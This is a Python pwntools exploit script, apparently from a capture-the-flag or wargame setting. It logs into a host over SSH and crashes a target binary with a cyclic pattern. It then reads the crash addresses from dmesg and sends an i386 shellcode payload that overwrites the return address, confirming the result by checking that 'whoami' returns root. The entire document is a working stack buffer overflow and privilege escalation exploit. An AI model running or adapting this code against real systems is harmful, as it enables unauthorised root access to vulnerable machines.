from pwn import *
import os.path as op

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.PORT))

# trigger a crash with a pattern
p = s.system(args.BIN)
p.sendline(cyclic(0x100))
assert p.recv() == 'Segmentation fault\n'
p.close()

# parse "segfault at 61616174 ip 61616174 sp bffffd00 error 4"
p = s.system('dmesg | grep %s | tail -n 1' % op.basename(args.BIN))
p.recvuntil('segfault at ')
report = p.recvline().split()
assert (report[1], report[3]) == ('ip', 'sp')
ip, sp = int(report[2], 16), int(report[4], 16)
log.info('ip: %08x', ip)
log.info('sp: %08x', sp)
p.close()

# WARN: the shellcode pushes on the stack and will overlap with sp if too
# large. This typically happens with nops as initial padding.
sh = asm(shellcraft.i386.linux.sh())
ip_off = cyclic_find(ip)
buf = ((sp - 8) & ~0xf) - 0x40
payload = fit({0: sh, ip_off: buf})

p = s.system(args.BIN)
p.sendline(payload)
p.recv()  # read prompt
p.sendline('whoami')
whoami = p.recvline().strip()
log.info('whoami: %s', whoami)
assert whoami == 'root'
